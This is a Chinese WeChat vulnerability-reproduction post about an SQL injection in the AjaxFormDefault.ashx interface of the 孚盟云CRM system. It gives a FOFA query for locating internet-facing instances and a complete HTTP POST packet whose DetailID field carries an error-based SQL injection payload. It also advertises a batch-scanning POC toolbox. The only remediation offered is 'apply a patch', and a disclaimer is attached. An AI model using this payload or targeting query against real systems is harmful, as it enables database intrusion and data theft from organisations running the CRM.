---
title: 孚盟云CRM AjaxFormDefault.ashx接口存在SQL注入漏洞 附POC
url: https://mp.weixin.qq.com/s/2tKiLXsB9vW-nBDUvJKrsw
source: Doonsec's feed
date: 2026-03-13
fetch_date: 2026-03-14T04:03:20.644346
---

# 孚盟云CRM AjaxFormDefault.ashx接口存在SQL注入漏洞 附POC

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6zibNNzQz9DhoicPYqzngicnvpcIR1ibYBYpTaHzLicGLWLas6rfGALD6cWNhdNfHiaY4ARymbYFDhTEiatZ7CIQdwkoxEWjUNFC2uJlc/0?wx_fmt=jpeg)

# 孚盟云CRM AjaxFormDefault.ashx接口存在SQL注入漏洞 附POC

2026-3-13更新
2026-3-13更新

南风漏洞复现文库

![]()

在小说阅读器中沉浸阅读

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

## 1. 孚盟云CRM简介

微信公众号搜索：南风漏洞复现文库
该文章 南风漏洞复现文库 公众号首发

本人只有 南风漏洞复现文库 和 南风网络安全 这两个公众号，其他公众号有意冒充，请注意甄别，避免上当受骗。

孚盟云CRM

## 2.漏洞描述

孚盟云CRM AjaxFormDefault.ashx接口存在SQL注入漏洞

CVE编号:

CNNVD编号:

CNVD编号:

## 3.影响版本

孚盟云CRM
![孚盟云CRM AjaxFormDefault.ashx接口存在SQL注入漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/b9KQYsB8q6zg9dzrmaMM1ZiaF0r1QoszdQbv8RvApuSPk74AKMeloIWzEPgYia5Z4oooUVP4jnXTgVzVbBBTrru0JuXudqSFGtL5chUWYMQ9M/640?wx_fmt=png&from=appmsg "null")

孚盟云CRM AjaxFormDefault.ashx接口存在SQL注入漏洞

## 4.fofa查询语句

app="孚盟软件-孚盟云"

## 5.漏洞复现

漏洞链接：http://xx.xx.xx.xx/m/Dingding/Ajax/AjaxFormDefault.ashx

漏洞数据包：

```
POST /m/Dingding/Ajax/AjaxFormDefault.ashx HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xx.xx.xx
Content-Length: 102
Content-Type: application/x-www-form-urlencoded

action=sendProductMessage&DetailID=' and 1=CONVERT(int,char(126)%2bchar(78)%2bchar(106)%2bchar(126))--
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6yicPulWbXn9TPjUvbDx3Xviazvr9hmtBNcvS8oIctia2iclDOoALlqxjt4LpvZEtxB3icjmic1AVjBZzh3IR02iciaR3K5AKMicjJt0lSY/640?wx_fmt=jpeg&from=appmsg "null")

## 6.POC&EXP

本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全

1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。

2: 免登录，免费fofa查询。

3: 更新其他实用网络安全工具项目。

4: 免费指纹识别，持续更新指纹库。

![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6wyZgicwGvibm1jnHz7tSzN9b4icEu316RTcxtIbBWyJric6pvib6GpD30ojeMP8EsDOnlbyzkMCMgtYUlzR7vwb9axvZTRwWC9rXcI/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6z5kk4Wbp6rmZtetlcsfgmnseGT8fIqL4xlpM2oW55y4q8xeELd94M2tMsjvXCHV7Q0ic0FP8I4stI9nSmR2QIA87vdFrQEVdcc/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6wULBjKcaLQcyEjGn70EYhlF3DF58LibhK19Qowl15ZJ3dTA4hLABWtKiaPibzNXMd35rKWNUYGTUzQdgWaXtSoktmwPaSHpbom44/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6zYbqtPznEkrdIBJUuSChaBf8H5iayicuRibjX4aHsAoxdFwl4o1qJkYM9icJPcyjDEmcLgdopuFhe7XebIbKFibL5ibtvgJ1o62bKX0/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6zQLw7RTvibg9d9o8jdgAiceCTld4ibXn5Jvfkwkantsib1cj5pmaJP9fiaqQF2Ficwzp4kRJt29Z2SIvmImnXadJJCWUNw3EKZvhCsY/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6wwrHjCF24EIYhrlorxRbnjQicGSqehTVfaR8MaxXyxtElpaMhmhDiab8P3z09jdOSguGN6fo7hVPfGIYRl2Gc9x8KJc7fMibLP04/640?wx_fmt=jpeg&from=appmsg "null")

## 7.整改意见

打补丁

## 8.往期回顾

[MetaCRM美特crm系统toviewspecial.jsp接口存在任意文件读取漏洞 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247490123&idx=1&sn=13e67eedef4d349b9322716fbdaa75eb&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/HsJDm7fvc3a95GFchUA48sGQuaFpFPPmL593YvcFo4IPeV2QPL2L72h5t4ibNq9IyXI9GmRWmvV2eh8zo3ldtmg/0?wx_fmt=png)

南风漏洞复现文库

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/HsJDm7fvc3a95GFchUA48sGQuaFpFPPmL593YvcFo4IPeV2QPL2L72h5t4ibNq9IyXI9GmRWmvV2eh8zo3ldtmg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过